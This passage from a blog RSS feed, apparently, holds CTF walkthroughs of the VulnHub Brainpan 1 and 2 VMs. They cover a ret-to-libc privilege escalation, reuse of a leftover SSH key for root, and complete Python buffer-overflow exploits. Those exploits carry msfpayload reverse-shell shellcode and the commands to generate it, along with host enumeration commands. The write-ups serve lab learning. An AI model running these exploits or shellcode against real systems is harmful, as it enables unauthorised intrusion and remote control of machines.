+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   brainpan-1.8.exe
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This protection means that code located on the stack will not be executed, so even if I could find a JMP ESP insruction (of which there are none in the binary anyway), shellcode will not be executed.  A popular type of attack to bypass NX is called &lt;code&gt;ret-to-libc&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;return-to-libc:57e48663af901e7c94c0472675ef84ed&#34;&gt;Return-to-libc&lt;/h2&gt;
+
+&lt;p&gt;libc is the standard c library and provides multiple functionality for a programmer, including Operating System functions etc.  It makes it possible to call pre-loaded functions via this library, rather than having to inject your own code.  It bypasses the NX protection since nothing is being executed from the stack.&lt;/p&gt;
+
+&lt;p&gt;I found I had to debug the binary directly on the brainpan 2 VM, as the functions were being loaded into memory in a different location than on my Kali VM (even with ALSR disabled).  I also had to copy the brainpan-1.8.exe binary and config file into /tmp, as I didn&amp;rsquo;t have permissions to use GDB in the current directory (a hearty hat-tip to teh3ck for pointing that out to me :))&lt;/p&gt;
+
+&lt;p&gt;I found the addresses where &lt;code&gt;system()&lt;/code&gt; and &lt;code&gt;exit()&lt;/code&gt; were loaded into memory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ gdb ./brainpan-1.8.exe -q
+Reading symbols from /tmp/brainpan-1.8.exe...done.
+
+(gdb) b main
+Breakpoint 1 at 0x8048d3b: file brainpan-1.8.c, line 50.
+
+(gdb) r
+Breakpoint 1, main (argc=1, argv=0xbffffea4) at brainpan-1.8.c:50
+
+(gdb) p system
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7fd0640 &amp;lt;system&amp;gt;
+
+(gdb) p exit
+$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7e8e550 &amp;lt;exit&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I have to pass a few variables into the system function.  The first is obviously the command to be executed, which I want to be &lt;code&gt;/bin/sh&lt;/code&gt;.  In a normal shell this would already be defined as an environmental variable (verify this by typing env on your VM and you&amp;rsquo;ll see something like &lt;code&gt;SHELL=/bin/bash&lt;/code&gt;).  Doing this in my brainpan shell shows that no such variable is defined - so I did so by:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cd /opt/old/brainpan-1.8
+$ export egg=&amp;quot;/bin/sh&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used my &lt;code&gt;findaddr&lt;/code&gt; binary to find the location of this new variable in memory:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ /tmp/findaddr
+egg =&amp;gt; 0xbfffffcc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The second variable is a system return address - you don&amp;rsquo;t strictly need this, but if a program does not exit cleanly it can often crash/core dump/leave logs etc.  So it&amp;rsquo;s probably better practice to give correct exit functions where possible.  I used the &lt;code&gt;exit()&lt;/code&gt; function for this, so that when I close my new shell, the brainpan-1.8.exe will also exit cleanly without crashing/seg faulting.&lt;/p&gt;
+
+&lt;p&gt;The structure of the exploit goes: Padding + system() + exit() + /bin/sh.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ python -c &#39;print &amp;quot;port=0&amp;quot; + &amp;quot;\n&amp;quot; + &amp;quot;ipaddr=&amp;quot; + (&amp;quot;A&amp;quot; * 44) + &amp;quot;\x40\x06\xfd\xb7\x50\xe5\xe8\xb7\xcc\xff\xff\xbf&amp;quot;&#39; &amp;gt; brainpan.cfg
+  
+$ ./brainpan-1.8.exe
+port = 0
+ipaddr = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@��P�����������8
+                                                                      ��!h����������x�
+[!] port not configured
+
+$ id;whoami
+uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)
+puck
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;robin-goodfellow:57e48663af901e7c94c0472675ef84ed&#34;&gt;Robin Goodfellow&amp;hellip;&lt;/h2&gt;
+
+&lt;p&gt;&amp;hellip; I mean Puck&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;I could now access puck&amp;rsquo;s home directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cd /home/puck
+$ 
+$ ls -la
+drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup
+-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history
+-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout
+-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc
+-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile
+drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As with the user anansi, I copied my public key into &lt;code&gt;.ssh/authorized_keys&lt;/code&gt; and SSH&amp;rsquo;d in through my existing tunnel.&lt;/p&gt;
+
+&lt;p&gt;So far, the &lt;code&gt;.bash_history&lt;/code&gt; file for all the users has been empty.  But the &lt;code&gt;.bash_history&lt;/code&gt; file inside &lt;code&gt;.backup&lt;/code&gt; still has some content - and very enlightening it was too.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;puck@brainpan2:~$ cat .backup/.bash_history
+[...snip...]
+ssh -l &amp;quot;root &amp;quot; brainpan2
+[...snip...]
+mkdir .backup
+mv .ssh .bash* .backup
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It appears as though puck has the ability to SSH as the real root user.  It&amp;rsquo;s evident that after the backup directory was created, the SSH Keys were moved inside.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;puck@brainpan2:~$ ls -la .backup/.ssh
+$ ls -la
+-rw------- 1 puck puck 1675 Nov  4  2013 id_rsa
+-rw-r--r-- 1 puck puck  396 Nov  4  2013 id_rsa.pub
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The files are still there, so I gave it a try&amp;hellip;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;puck@brainpan2:~$ ssh &amp;quot;root &amp;quot;@127.0.1.1 -p 2222 -i .backup/.ssh/id_rsa
+root@brainpan2:~# id; whoami
+uid=0(root ) gid=0(root ) groups=0(root )
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:57e48663af901e7c94c0472675ef84ed&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;root@brainpan2:~# cat /root/flag.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-2/flag.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;w00t.&lt;/p&gt;
+
+&lt;p&gt;Special thanks to:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; for creating a great challenge,&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt; for hosting,&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/teh_h3ck&#34;&gt;teh3ck&lt;/a&gt; for his kind words of encouragement.&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brainpan: 1 - Part 1</title>
+      <link>http://rastamouse.me/writeups/2014/brainpan-1-part-1/</link>
+      <pubDate>Wed, 28 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/brainpan-1-part-1/</guid>
+      <description>
+
+&lt;p&gt;Brainpan is a brilliant series of VMs created by &lt;a href=&#34;https://twitter.com/superkojiman&#34;&gt;superkojiman&lt;/a&gt; - the goal is to gain root access.  These challenges are quite long and involved as they&amp;rsquo;re not strictly at beginner level :), so I&amp;rsquo;ve split the solution into multiple parts.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:3c5805e5caac0bbd6084b7628143b7fb&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+  
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+|_http-title: Hacking Trends
+1 service unrecognized despite returning data.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The service on port &lt;code&gt;9999&lt;/code&gt; returns a mass of characters like HTML code, quite unreadable in the nmap output format, but with some evident words.  Pointing a web browser at it doesn&amp;rsquo;t seem to return anything, but connecting via &lt;code&gt;netcat&lt;/code&gt; does the trick.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-1/brainpan.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Every string I entered here returned an access denied message, and the &lt;code&gt;netcat&lt;/code&gt; connection closed.&lt;/p&gt;
+
+&lt;p&gt;I turned my attention back to the &lt;code&gt;SimpleHTTPServer&lt;/code&gt; on port &lt;code&gt;10000&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h2 id=&#34;nikto:3c5805e5caac0bbd6084b7628143b7fb&#34;&gt;Nikto&lt;/h2&gt;
+
+&lt;p&gt;The index page on the web server didn&amp;rsquo;t contain anything interesting, so I did some more enumeration.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nikto -h 192.168.127.128:10000 -Display 124
++ OSVDB-3092: /bin/: This might be interesting...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I popped over to this URL and found a directory listing, containing one file:  &lt;code&gt;brainpan.exe&lt;/code&gt;.  I downloaded this to my Kali machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# file brainpan.exe 
+brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This is a genuine Windows executable, so I ran in with &lt;code&gt;Wine&lt;/code&gt; to see what I would do.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# wine brainpan.exe 
+[+] initializing winsock...done.
+[+] server socket created.
+[+] bind done on port 9999
+[+] waiting for connections.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So it&amp;rsquo;s bound itself to port &lt;code&gt;9999&lt;/code&gt; - I connected to it with &lt;code&gt;netcat&lt;/code&gt; and received the same output as the application running on brainpan.&lt;/p&gt;
+
+&lt;h2 id=&#34;time-to-debug:3c5805e5caac0bbd6084b7628143b7fb&#34;&gt;Time to Debug&lt;/h2&gt;
+
+&lt;p&gt;If this application contains an exploitable vulnerability, then I may be able to leverage it to obtain a shell on brainpan.  I ran it through &lt;code&gt;strings&lt;/code&gt;, to get an idea of the functions inside.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# strings brainpan.exe
+
+[...snip...]
+
+[get_reply] s = [%s]
+[get_reply] copied %d bytes to buffer
+shitstorm
+
+[...snip...]
+
+strcpy
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Some interesting information here - first of all, it appears as though the valid password is stored inside the binary in plaintext.  I opened a new &lt;code&gt;netcat&lt;/code&gt; connection and tried it.  I received an &lt;em&gt;ACCESS GRANTED&lt;/em&gt; message, but it still exists back to the command prompt.&lt;/p&gt;
+
+&lt;p&gt;Secondly, it seems as though the password input is passed to a buffer using the strcpy function.  This is notoriously vulnerable to buffer overflows, as it does nothing to validate the length of the input and blindly copies it into the buffer.  Hopefully, this would allow me to hijack the execution flow of the application and execute my own code to help gain access to the system.&lt;/p&gt;
+
+&lt;p&gt;Initially I tried to debug it whilst it was running in Wine on my Kali VM, but it didn&amp;rsquo;t work reliably.  I therefore moved it to a Windows XP VM, which I downloaded from Modern.IE.  My debugger of choice is &lt;code&gt;Immunity Debugger&lt;/code&gt; paired with &lt;code&gt;mona.py&lt;/code&gt; from the &lt;code&gt;Corelan Team&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-1/imdg.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;My Windows VM is running on the same internal subnet as brainpan and Kali, its IP address is 192.168.127.130.  I launched &lt;code&gt;brainpan.exe&lt;/code&gt; in the debugger, and from my Kali VM, sent a long string of A&amp;rsquo;s to the application.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~# python -c &#39;print &amp;quot;A&amp;quot; * 100&#39; | nc 192.168.127.130 9999&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I started at 100 and worked my way up until the application crashed, which occured at &lt;code&gt;600 bytes&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-1/crash.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We can see here that &lt;code&gt;EIP&lt;/code&gt;, &lt;code&gt;EDX&lt;/code&gt; and &lt;code&gt;ESP&lt;/code&gt; have been overwritten with ASCII A&amp;rsquo;s (41 Hex).  The next step is to calculate how many bytes are required to overwrite EIP.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~# ruby /usr/share/metasploit-framework/tools/pattern_create.rb 600 | nc 192.168.127.130 9999&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The application crashed again and the value of &lt;code&gt;EIP&lt;/code&gt; read &lt;code&gt;35724134&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ruby /usr/share/metasploit-framework/tools/pattern_offset.rb 35724134
+[*] Exact match at offset 524
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This tells us that the number of bytes required before overwriting &lt;code&gt;EIP&lt;/code&gt; is &lt;code&gt;524&lt;/code&gt;.  I confirmed this by placing four B&amp;rsquo;s into &lt;code&gt;EIP&lt;/code&gt;, wedged between a group of A&amp;rsquo;s and C&amp;rsquo;s.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~# python -c &#39;print (&amp;quot;A&amp;quot; * 524) + (&amp;quot;B&amp;quot; * 4) + (&amp;quot;C&amp;quot; * 72)&#39; | nc 192.168.127.130 9999&lt;/code&gt;&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-1/eip.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;&lt;code&gt;EIP&lt;/code&gt; was overwritten with my B&amp;rsquo;s as expected.  Some more analysis of the stack also shows that &lt;code&gt;ESP&lt;/code&gt; starts directly underneath the address &lt;code&gt;EIP&lt;/code&gt; was pointing at, as seen by the C&amp;rsquo;s.  If I can find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction, I would be able to place by shellcode there.&lt;/p&gt;
+
+&lt;p&gt;I&amp;rsquo;ve been using &lt;code&gt;600&lt;/code&gt; bytes so far and most of this is taken up to reach &lt;code&gt;EIP&lt;/code&gt; and &lt;code&gt;ESP&lt;/code&gt;, to place shellcode in &lt;code&gt;ESP&lt;/code&gt; I will need to send more data.  I increased the buffer to &lt;code&gt;1000&lt;/code&gt; bytes (by adding more C&amp;rsquo;s) to see if the application still trashed in the same way, which it did.&lt;/p&gt;
+
+&lt;p&gt;The next stage was to find a valid &lt;code&gt;JMP ESP&lt;/code&gt; instruction within the binary, and obtain it&amp;rsquo;s location in memory.&lt;/p&gt;
+
+&lt;p&gt;This can be done in Kali using &lt;code&gt;objdump&lt;/code&gt;, but I used the &lt;code&gt;mona&lt;/code&gt; plugin for Immunity Debugger.  I find this more useful since it&amp;rsquo;s capable of searching within Windows DLLs as well as the binary itself, and whether or not they&amp;rsquo;re protected by ASLR, SafeSEH etc.  It&amp;rsquo;s not applicable in this scenario but it&amp;rsquo;s good to be able to use multiple tools :)&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;!mona find -s &#39;\xff\xe4&#39; -m brainpan.exe&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;So there is a single &lt;code&gt;JMP ESP&lt;/code&gt; instruction in the brainpan binary.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;0x311712f3 : &#39;\xff\xe4&#39; |  {PAGE_EXECUTE_READ} [brainpan.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Documents and Settings\IEUser\My Documents\brainpan.exe)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I have a memory location for &lt;code&gt;JMP ESP&lt;/code&gt; to put into &lt;code&gt;EIP&lt;/code&gt;, I started writing my exploit, dubbed &lt;code&gt;skull_cracker&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+  
+import socket
+  
+target = &#39;192.168.127.130&#39;
+port = 9999
+  
+payload = &amp;quot;A&amp;quot; * 524
+payload += &amp;quot;\xf3\x12\x17\x31&amp;quot;
+payload += &amp;quot;C&amp;quot; * (1000 - 4 - 524)
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+try:
+  
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(payload)
+  
+except:
+  
+        print &amp;quot;[x] Could not connect to &amp;quot; + target + &amp;quot; on &amp;quot; + str(port) + &amp;quot;.&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I wanted to test this, to ensure the jump occured when &lt;code&gt;EIP&lt;/code&gt; becomes overwritten.  This is quite easily achieved by placing a breakpoint in the debugger, which will automatically pause execution when a particular memory address is reached.&lt;/p&gt;
+
+&lt;p&gt;I used the &lt;code&gt;Go to &amp;gt; Expression&lt;/code&gt; command in Immunity, to go to &lt;code&gt;0x311712f3&lt;/code&gt; - as expected, the &lt;code&gt;JMP ESP&lt;/code&gt; instruction was here.  I placed a breakpoint and ran my exploit.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-1/break.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The breakpoint was reached, which means the &lt;code&gt;JMP ESP&lt;/code&gt; instruction had been reached.  I stepped the debugger forward by one instruction, with the expectation it would take me to the first group of C&amp;rsquo;s.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/brainpan-1/step.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Excellent, all going to plan so far.&lt;/p&gt;
+
+&lt;p&gt;So really, the final stage is to add some shellcode to be executed.  I used &lt;code&gt;msfpayload&lt;/code&gt; to generate some reverse Windows shellcode.  I didn&amp;rsquo;t test for any bad characters, I just excluded null bytes and kept my fingers crossed.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;root@kali:~/brainpan/1# msfpayload windows/shell_reverse_tcp LHOST=192.168.127.127 R | msfencode -e x86/shikata_ga_nai -b &#39;\x00&#39; -t c&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I placed this into my exploit, along with a small &lt;code&gt;NOP&lt;/code&gt; slide, so that it looked like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+  
+import socket
+  
+target = &#39;192.168.127.130&#39;
+port = 9999
+  
+shellcode = (&amp;quot;\xda\xd9\xd9\x74\x24\xf4\xbd\x28\x3b\xf5\xb9\x58\x31\xc9\xb1&amp;quot; # 341 bytes
+&amp;quot;\x4f\x31\x68\x19\x03\x68\x19\x83\xc0\x04\xca\xce\x09\x51\x83&amp;quot;
+&amp;quot;\x31\xf2\xa2\xf3\xb8\x17\x93\x21\xde\x5c\x86\xf5\x94\x31\x2b&amp;quot;
+&amp;quot;\x7e\xf8\xa1\xb8\xf2\xd5\xc6\x09\xb8\x03\xe8\x8a\x0d\x8c\xa6&amp;quot;
+&amp;quot;\x49\x0c\x70\xb5\x9d\xee\x49\x76\xd0\xef\x8e\x6b\x1b\xbd\x47&amp;quot;
+&amp;quot;\xe7\x8e\x51\xe3\xb5\x12\x50\x23\xb2\x2b\x2a\x46\x05\xdf\x80&amp;quot;
+&amp;quot;\x49\x56\x70\x9f\x02\x4e\xfa\xc7\xb2\x6f\x2f\x14\x8e\x26\x44&amp;quot;
+&amp;quot;\xee\x64\xb9\x8c\x3f\x84\x8b\xf0\x93\xbb\x23\xfd\xea\xfc\x84&amp;quot;
+&amp;quot;\x1e\x99\xf6\xf6\xa3\x99\xcc\x85\x7f\x2c\xd1\x2e\x0b\x96\x31&amp;quot;
+&amp;quot;\xce\xd8\x40\xb1\xdc\x95\x07\x9d\xc0\x28\xc4\x95\xfd\xa1\xeb&amp;quot;
+&amp;quot;\x79\x74\xf1\xcf\x5d\xdc\xa1\x6e\xc7\xb8\x04\x8f\x17\x64\xf8&amp;quot;
+&amp;quot;\x35\x53\x87\xed\x4f\x3e\xc0\xc2\x7d\xc1\x10\x4d\xf6\xb2\x22&amp;quot;
+&amp;quot;\xd2\xac\x5c\x0f\x9b\x6a\x9a\x70\xb6\xca\x34\x8f\x39\x2a\x1c&amp;quot;
+&amp;quot;\x54\x6d\x7a\x36\x7d\x0e\x11\xc6\x82\xdb\xb5\x96\x2c\xb4\x75&amp;quot;
+&amp;quot;\x47\x8d\x64\x1d\x8d\x02\x5a\x3d\xae\xc8\xed\x7a\x39\x33\x45&amp;quot;
+&amp;quot;\xfb\xc5\xdb\x94\x03\x2b\x40\x10\xe5\x21\x68\x74\xbe\xdd\x11&amp;quot;
+&amp;quot;\xdd\x34\x7f\xdd\xcb\xdc\x1c\x4c\x90\x1c\x6a\x6d\x0f\x4b\x3b&amp;quot;
+&amp;quot;\x43\x46\x19\xd1\xfa\xf0\x3f\x28\x9a\x3b\xfb\xf7\x5f\xc5\x02&amp;quot;
+&amp;quot;\x75\xdb\xe1\x14\x43\xe4\xad\x40\x1b\xb3\x7b\x3e\xdd\x6d\xca&amp;quot;
+&amp;quot;\xe8\xb7\xc2\x84\x7c\x41\x29\x17\xfa\x4e\x64\xe1\xe2\xff\xd1&amp;quot;
+&amp;quot;\xb4\x1d\xcf\xb5\x30\x66\x2d\x26\xbe\xbd\xf5\x56\xf5\x9f\x5c&amp;quot;
+&amp;quot;\xff\x50\x4a\xdd\x62\x63\xa1\x22\x9b\xe0\x43\xdb\x58\xf8\x26&amp;quot;
+&amp;quot;\xde\x25\xbe\xdb\x92\x36\x2b\xdb\x01\x36\x7e&amp;quot;)
+  
+payload = &amp;quot;A&amp;quot; * 524
+payload += &amp;quot;\xF3\x12\x17\x31&amp;quot;
+payload += &amp;quot;\x90&amp;quot; * 20
+payload += shellcode
+payload += &amp;quot;C&amp;quot; * (1000 - 341 - 20 - 4 - 524)
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+try:
+  
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(payload)
+  
+except:
+  
+        print &amp;quot;[x] Could not connect to &amp;quot; + target + &amp;quot; on &amp;quot; + str(port) + &amp;quot;.&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I started up a multi/hander and launched my exploit.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# msfcli multi/handler payload=windows/shell_reverse_tcp lhost=192.168.127.127 E
+  
+[*] Started reverse handler on 192.168.127.127:4444
+[*] Starting the payload handler...
+[*] Command shell session 1 opened (192.168.127.127:4444 -&amp;gt; 192.168.127.130:1288) at 2014-05-26 19:10:05 +0100
+  
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+  
+C:\Documents and Settings\IEUser\My Documents&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Excellent.  Now I have a working exploit, all I need to do is swap the Windows shellcode out for Linux shellcode (also generated with &lt;code&gt;msfpayload&lt;/code&gt;), and adjust the padding to account for the smaller shellcode.  My final payload was:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
+  
+import socket
+  
+target = &#39;192.168.127.128&#39;
+port = 9999
+  
+shellcode = (&amp;quot;\xbe\x05\x65\x51\x54\xdd\xc3\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1&amp;quot; # 95 bytes
+&amp;quot;\x12\x31\x75\x12\x03\x75\x12\x83\xe8\x99\xb3\xa1\xc3\xba\xc3&amp;quot;
+&amp;quot;\xa9\x70\x7e\x7f\x44\x74\x09\x9e\x28\x1e\xc4\xe1\xda\x87\x66&amp;quot;
+&amp;quot;\xde\x11\xb7\xce\x58\x53\xdf\x10\x32\xdc\x60\xf9\x41\x23\x8f&amp;quot;
+&amp;quot;\xa5\xcc\xc2\x1f\x33\x9f\x55\x0c\x0f\x1c\xdf\x53\xa2\xa3\x8d&amp;quot;
+&amp;quot;\xfb\x12\x8b\x42\x93\x04\xfc\xc6\x0a\xbb\x8b\xe4\x9e\x10\x05&amp;quot;
+&amp;quot;\x0b\xae\x9c\xd8\x4c&amp;quot;)
+  
+payload = &amp;quot;A&amp;quot; * 524
+payload += &amp;quot;\xF3\x12\x17\x31&amp;quot;
+payload += &amp;quot;\x90&amp;quot; * 20
+payload += shellcode
+payload += &amp;quot;C&amp;quot; * (1000 - 95 - 20 - 4 - 524)
+  
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+try:
+  
+        s.connect((target, port))
+        s.recv(1024)
+        s.send(payload)
+  
+except:
+  
+        print &amp;quot;[x] Could not connect to &amp;quot; + target + &amp;quot; on &amp;quot; + str(port) + &amp;quot;.&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/brainpan/1# msfcli multi/handler payload=linux/x86/shell_reverse_tcp lhost=192.168.127.127 E
+  
+[*] Command shell session 1 opened (192.168.127.127:4444 -&amp;gt; 192.168.127.128:36381) at 2014-05-26 19:16:13 +0100
+  
+id
+uid=1002(puck) gid=1002(puck) groups=1002(puck)
+  
+pwd
+/home/puck
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I finally have a shell on brainpan - it&amp;rsquo;s time to end Part 1&amp;hellip;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brainpan: 1 - Part 2</title>
+      <link>http://rastamouse.me/writeups/2014/brainpan-1-part-2/</link>
+      <pubDate>Wed, 28 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/brainpan-1-part-2/</guid>
+      <description>
+
+&lt;h2 id=&#34;shell:edcb2de0cbbe69c925e398e09c0d9e58&#34;&gt;Shell&lt;/h2&gt;
+
+&lt;p&gt;Now I had a shell, I could start exploring the system.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;cat /etc/passwd
+reynard:x:1000:1000:Reynard,,,:/home/reynard:/bin/bash
+anansi:x:1001:1001:Anansi,,,:/home/anansi:/bin/bash
+puck:x:1002:1002:Puck,,,:/home/puck:/bin/bash
+  
+cat /etc/group
+sudo:x:27:reynard
+  
+sudo -l
+User puck may run the following commands on this host:
+    (root) NOPASSWD: /home/anansi/bin/anansi_util
+  
+find / -perm -4000 -type f 2&amp;gt;/dev/null
+
+[...snip...]
+
+/usr/local/bin/validate
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So a few things here :)&lt;/p&gt;
+
+&lt;p&gt;It seems puck can run &lt;code&gt;anansi_util&lt;/code&gt; with sudo privileges.  I tried playing around with it a little bit, but couldn&amp;rsquo;t make it do much.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+&lt;/code&gt;&lt;/pre&gt;
+
